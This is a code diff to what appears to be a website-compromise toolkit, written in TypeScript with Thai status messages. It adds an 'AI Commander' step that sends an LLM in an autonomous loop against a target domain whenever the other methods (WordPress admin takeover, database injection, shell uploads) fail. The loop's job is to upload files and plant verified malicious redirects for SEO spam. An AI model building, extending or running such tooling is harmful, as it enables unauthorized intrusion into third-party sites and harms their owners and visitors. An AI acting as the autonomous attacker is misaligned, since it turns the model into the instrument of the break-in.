@@ -29,6 +29,7 @@ import { runWpAdminTakeover, runShellExecFallback, type WpAdminConfig, type WpTa
 import { runWpDbInjection, type WpDbInjectionConfig, type WpDbInjectionResult } from "./wp-db-injection";
 import { proxyPool } from "./proxy-pool";
 import { runShelllessAttacks, type ShelllessResult, type ShelllessConfig } from "./shellless-attack-engine";
+import { runAiCommander, type AiCommanderResult, type AiCommanderEvent } from "./ai-autonomous-engine";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -60,6 +61,9 @@ export interface PipelineConfig {
   methodPriority?: Array<{ id: string; enabled: boolean }>;
   proxyList?: string[]; // multiple proxy URLs
   weightedRedirects?: Array<{ url: string; weight: number }>;
+  // AI Commander — LLM-driven autonomous attack loop
+  enableAiCommander?: boolean;
+  aiCommanderMaxIterations?: number;
 }
 
 export interface PipelineEvent {
@@ -118,6 +122,16 @@ export interface PipelineResult {
   emailSent?: boolean;
   // AI Target Analysis (Phase 0)
   aiTargetAnalysis?: AiTargetAnalysis | null;
+  // AI Commander result
+  aiCommanderResult?: {
+    success: boolean;
+    iterations: number;
+    successfulMethod: string | null;
+    uploadedUrl: string | null;
+    redirectVerified: boolean;
+    totalDurationMs: number;
+    decisionsCount: number;
+  } | null;
 }
 
 type EventCallback = (event: PipelineEvent) => void;
@@ -2101,6 +2115,81 @@ export async function runUnifiedAttackPipeline(
     });
   }
 
+  // ═══ AI COMMANDER — LLM-Driven Autonomous Attack Loop ═══
+  // Last resort: if ALL methods failed, let AI Commander try autonomously
+  let aiCommanderResult: AiCommanderResult | null = null;
+  const noSuccessfulUploads = uploadedFiles.filter(f => f.verified).length === 0;
+  if (noSuccessfulUploads && config.enableAiCommander !== false) {
+    const domain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+    onEvent({
+      phase: "shellless" as any,
+      step: "ai_commander_start",
+      detail: `\u{1F916} AI Commander \u0e40\u0e23\u0e34\u0e48\u0e21\u0e17\u0e33\u0e07\u0e32\u0e19 \u2014 LLM \u0e08\u0e30\u0e27\u0e34\u0e40\u0e04\u0e23\u0e32\u0e30\u0e2b\u0e4c target \u0e41\u0e25\u0e30\u0e2b\u0e32\u0e27\u0e34\u0e18\u0e35\u0e17\u0e33\u0e08\u0e19\u0e01\u0e27\u0e48\u0e32\u0e08\u0e30\u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08 (max ${config.aiCommanderMaxIterations || 10} iterations)...`,
+      progress: 95,
+    });
+
+    try {
+      aiCommanderResult = await runAiCommander({
+        targetDomain: domain,
+        redirectUrl: config.redirectUrl,
+        maxIterations: Math.min(config.aiCommanderMaxIterations || 10, 15),
+        timeoutPerAttempt: 15000,
+        seoKeywords: config.seoKeywords,
+        onEvent: (event: AiCommanderEvent) => {
+          onEvent({
+            phase: "shellless" as any,
+            step: `ai_cmd_${event.type}_${event.iteration}`,
+            detail: event.detail,
+            progress: 95 + Math.min(event.iteration / (event.maxIterations || 10) * 4, 4),
+            data: {
+              ...event.data,
+              iteration: event.iteration,
+              maxIterations: event.maxIterations,
+              eventType: event.type,
+            },
+          });
+        },
+      });
+
+      if (aiCommanderResult.success && aiCommanderResult.uploadedUrl) {
+        uploadedFiles.push({
+          url: aiCommanderResult.uploadedUrl,
+          shell: shells[0] || { filename: "ai-commander", content: "", type: "php" as any, technique: "ai_commander", obfuscation: "none" as any },
+          method: `ai_commander_${aiCommanderResult.successfulMethod}`,
+          verified: true,
+          redirectWorks: aiCommanderResult.redirectVerified,
+          redirectDestinationMatch: aiCommanderResult.redirectVerified,
+          finalDestination: config.redirectUrl,
+          httpStatus: 200,
+        });
+        aiDecisions.push(`AI Commander SUCCESS: ${aiCommanderResult.successfulMethod} after ${aiCommanderResult.iterations} iterations`);
+        onEvent({
+          phase: "shellless" as any,
+          step: "ai_commander_success",
+          detail: `\u2705 AI Commander \u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08! Upload \u0e17\u0e35\u0e48 ${aiCommanderResult.uploadedUrl} \u0e14\u0e49\u0e27\u0e22 ${aiCommanderResult.successfulMethod} (${aiCommanderResult.iterations} iterations)`,
+          progress: 99,
+          data: aiCommanderResult,
+        });
+      } else {
+        aiDecisions.push(`AI Commander FAILED after ${aiCommanderResult.iterations} iterations`);
+        onEvent({
+          phase: "shellless" as any,
+          step: "ai_commander_exhausted",
+          detail: `\u26A0\uFE0F AI Commander \u0e2b\u0e21\u0e14 iterations (${aiCommanderResult.iterations}) \u2014 \u0e44\u0e21\u0e48\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16 upload \u0e44\u0e14\u0e49\u0e2a\u0e33\u0e40\u0e23\u0e47\u0e08`,
+          progress: 99,
+        });
+      }
+    } catch (error: any) {
+      errors.push(`AI Commander error: ${error.message}`);
+      onEvent({
+        phase: "shellless" as any,
+        step: "ai_commander_error",
+        detail: `AI Commander error: ${error.message}`,
+        progress: 99,
+      });
+    }
+  }
+
   // ─── Emit final world state ───
   onEvent({
     phase: "world_update",
@@ -2169,6 +2258,16 @@ export async function runUnifiedAttackPipeline(
     cdnUploadResult: cdnUploadResult || undefined,
     // AI Target Analysis (Phase 0)
     aiTargetAnalysis: aiTargetAnalysis || undefined,
+    // AI Commander result
+    aiCommanderResult: aiCommanderResult ? {
+      success: aiCommanderResult.success,
+      iterations: aiCommanderResult.iterations,
+      successfulMethod: aiCommanderResult.successfulMethod,
+      uploadedUrl: aiCommanderResult.uploadedUrl,
+      redirectVerified: aiCommanderResult.redirectVerified,
+      totalDurationMs: aiCommanderResult.totalDurationMs,
+      decisionsCount: aiCommanderResult.decisions.length,
+    } : undefined,
   };
 
   if (fullSuccess) {
